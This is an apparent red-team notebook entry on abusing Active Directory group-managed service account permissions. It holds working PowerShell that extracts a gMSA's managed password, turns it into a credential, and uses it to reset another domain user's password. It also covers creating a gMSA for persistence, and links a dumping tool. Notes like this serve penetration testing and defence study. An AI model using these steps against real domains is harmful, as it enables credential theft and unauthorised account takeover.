

[[Active-Directory-Permissions]]



## sMSA or gMSA permissions

No Kerberoast no problem with [[Active-Directory-sMSA-gMSA]] permissions a user can reset passwords! Python tool below:
-  [GMSA dumper](https://github.com/micahvandeusen/gMSADumper)!

Retrieving a Password

Get the gmsa account managed password property and convert the password blob:
```powershell
$gmsa = Get-ADServiceAccount -Identity $gmsaIdentity -Properties 'msDS-ManagedPassword'
$gmsaPass = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $gmsaPass
```
Create a credential object and then use the `SecureCurrentPassword` property to perform powershell runas in  a `Invoke-Command` code block: 
```powershell
$credobj = ConvertFrom-ADManagedPasswordBlob $gmsaPass
$credobj.SecureCurrentPassword
$credential = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $credobj.SecureCurrentPassword
# Now we can invoke command
Invoke-Command -Computername localhost -Credential $credential -Scriptblock { net user TRISTAN.DAVIES password123! /domain }
```

To create a GMSA - for [[AD-Persistence-ACLs]] or testing
```powershell
# Create a new KDS Root Key that will be used by DC to generate managed passwords
Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)

# Create a new GMSA
New-ADServiceAccount `
	-Name 'SQL_HQ_Primary' `
	-DNSHostName 'sql1.adatum.com'
# Set a Managed Password ACL
Set-ADServiceAccount `
	-Identity 'SQL_HQ_Primary' `
	-PrincipalsAllowedToRetrieveManagedPassword 'Administrator'

```

## References

 [dsinternals - Retrieving Cleartext GMSA Passwords from Active Directory](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)